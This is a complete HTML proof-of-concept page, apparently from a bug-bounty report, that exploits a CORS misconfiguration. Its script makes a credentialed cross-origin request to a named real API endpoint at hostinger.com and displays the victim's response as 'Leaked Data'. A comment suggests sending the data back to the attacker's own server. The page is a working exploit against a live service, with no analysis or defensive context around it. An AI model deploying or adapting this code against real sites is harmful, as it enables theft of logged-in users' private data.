<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<script>
  fetch("https://experiment-api.hostinger.com/sdk/v2/vardata?v=0", {
    method: "GET",
    headers: {
      "X-Custom-Header": "abc"
    },
    credentials: "include"
  })
  .then(res => res.text())
  .then(data => {
    // Send data back to your own server or just show it
    alert("Leaked Data: " + data);
  })
  .catch(err => console.error("Request failed:", err));
</script>
</body>
</html>
